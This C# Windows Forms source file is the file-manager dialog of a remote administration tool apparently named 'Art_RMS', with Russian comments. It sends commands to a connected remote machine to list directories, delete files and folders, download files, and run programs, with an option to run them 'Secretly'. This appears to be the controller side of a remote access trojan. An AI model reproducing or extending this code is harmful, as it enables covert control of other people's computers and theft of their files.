using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;

namespace Art_RMS.Forms
{
    public partial class Dialog_File_Manager : Form
    {
        Listener server = new Listener();
        public Dialog_File_Manager()
        {
            InitializeComponent();
        }

        public void Received(List<Array> Response)
        {
            Invoke(new ThreadStart(() =>
            {
                if(Encoding.UTF8.GetString((byte[])Response[1]) != "")
                    txtPath.Text = Encoding.UTF8.GetString((byte[])Response[1]) + @"\";
                else
                    txtPath.Text = "";
                ListViewItem Item;
                Directory_List.Items.Clear();
                for (int i = 2; i < (Response.Count - 1); i++)
                {
                    string[] Row = Encoding.UTF8.GetString((byte[])Response[i]).Split(';');
                    if(Row[1] != "")
                        Item = new ListViewItem(new string[] { Row[0], Row[1] + " кб." });
                    else
                        Item = new ListViewItem(new string[] { Row[0], Row[1] });
                    Directory_List.Items.Add(Item);
                }
            }));
        }  //получили ответ
        private void Dialog_File_Manager_Load(object sender, EventArgs e)
        {
            server.Send(Convert.ToInt32(this.Tag), "GET_FILE_MANAGER|");
        } //загрузка формы
        private void Double_Click_In_Dir(object sender, EventArgs e)
        {
            ListViewItem item = Directory_List.SelectedItems[0];
            server.Send(Convert.ToInt32(this.Tag), "GET_FILE_MANAGER|" + txtPath.Text + Directory_List.Items[item.Index].SubItems[0].Text);
        } 
        private void Dialog_File_Manager_FormClosing(object sender, FormClosingEventArgs e)
        {
            foreach (Form frm in Listener.Forms)
            {
                if (frm.Tag == this.Tag && frm.Text.Contains("Dialog_File_Manager"))
                {
                    Listener.Forms.Remove(frm);
                    break;
                }
            }
        }
        private void To_Back_Btn_Click(object sender, EventArgs e)
        {
            string path = "";
            if(txtPath.Text.Length > 4)
                path = txtPath.Text.Substring(0, txtPath.Text.LastIndexOf("\\", txtPath.Text.Length - 2));
            server.Send(Convert.ToInt32(this.Tag), "GET_FILE_MANAGER|" + path);
        } //Кнопка назад

        #region Context menu functions

        private void Open_Context_Menu(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                contextMenuStrip1.Show(MousePosition);
            }
        } //Открытие контекстного меню
        private void Run_Click(object sender, EventArgs e)
        {
            int Type_run = 0;
            if ((sender as ToolStripMenuItem).Text == "Secretly")
                Type_run = 1;
            ListViewItem item = Directory_List.SelectedItems[0];
            if (Directory_List.Items[item.Index].SubItems[1].Text != "" && item != null)
                server.Send(Convert.ToInt32(this.Tag), "RUN_FILE_FROM_MANAGER|" + txtPath.Text + Directory_List.Items[item.Index].SubItems[0].Text + "|" + Type_run);
        } //Запуск программы
        private void Delete_Click(object sender, EventArgs e)
        {
            ListViewItem item = Directory_List.SelectedItems[0];
            if (Directory_List.Items[item.Index].SubItems[1].Text != "" && item != null)
            {
                server.Send(Convert.ToInt32(this.Tag), "FUNCTION_WITH_FILE_OR_DIR_FROM_MANAGER|DELETE_FILE|" + txtPath.Text + Directory_List.Items[item.Index].SubItems[0].Text);
                Thread.Sleep(1000);
                Refresh_dir_Click(null, null);
            }
            else if(Directory_List.Items[item.Index].SubItems[1].Text != "")
            {
                server.Send(Convert.ToInt32(this.Tag), "FUNCTION_WITH_FILE_OR_DIR_FROM_MANAGER|DELETE_DIRECTORY|" + txtPath.Text + Directory_List.Items[item.Index].SubItems[0].Text);
                Thread.Sleep(1000);
                Refresh_dir_Click(null, null);
            }
        } //удаление папки или файла
        private void Refresh_dir_Click(object sender, EventArgs e)
        {
            server.Send(Convert.ToInt32(this.Tag), "GET_FILE_MANAGER|" + txtPath.Text);
        } // Обновить
        private void Download_File_Click(object sender, EventArgs e)
        {
            ListViewItem item = Directory_List.SelectedItems[0];
            if (Directory_List.Items[item.Index].SubItems[1].Text != "" && item != null)
            {
                    server.Send(Convert.ToInt32(this.Tag), "DOWNLOAD_FILE_FROM_MANAGER|" + txtPath.Text + Directory_List.Items[item.Index].SubItems[0].Text);
            }
        } //Загрузить файл

        #endregion
    }
}
